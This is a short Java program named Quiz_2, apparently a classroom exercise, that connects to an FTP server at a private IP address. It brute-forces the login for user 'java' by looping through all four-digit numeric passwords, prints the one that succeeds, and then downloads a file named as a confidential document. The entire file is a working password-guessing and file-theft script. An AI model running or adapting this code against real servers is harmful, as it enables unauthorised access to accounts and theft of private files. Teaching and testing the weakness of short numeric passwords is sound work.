import java.io.IOException;

import ftp.FileTransferProtocol;
import it.sauronsoftware.ftp4j.FTPClient;
import it.sauronsoftware.ftp4j.FTPException;
import it.sauronsoftware.ftp4j.FTPIllegalReplyException;

public class Quiz_2 {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		
		// FTPClient 인스턴스 생성
		FTPClient client = new FTPClient();

		// FileTransferProtocol 인스턴스 생성
		FileTransferProtocol  ftp = new FileTransferProtocol();
		
		// Connect
		ftp.setIp("192.168.50.65");
		ftp.connect(client);
		
		String pwd = "";
		for(int i = 1000 ; i < 10000 ; i++) {
			try {
				client.login("java", i+"");
				System.out.println("Login Success!");
				pwd = i+"";
				break;
			} catch (IllegalStateException | IOException | FTPIllegalReplyException | FTPException e) {
				// TODO Auto-generated catch block
				System.out.println("Login Fail!");
				//e.printStackTrace();
			}
		}
		System.out.println(pwd);
		//Daownload
		ftp.setHostFileName("기밀문서.txt");
		//ftp.encording(client, "UTF-8");
		client.setCharset("EUC-KR");
		//client.setCharset("UTF-8");
		ftp.download(client);

	}

}
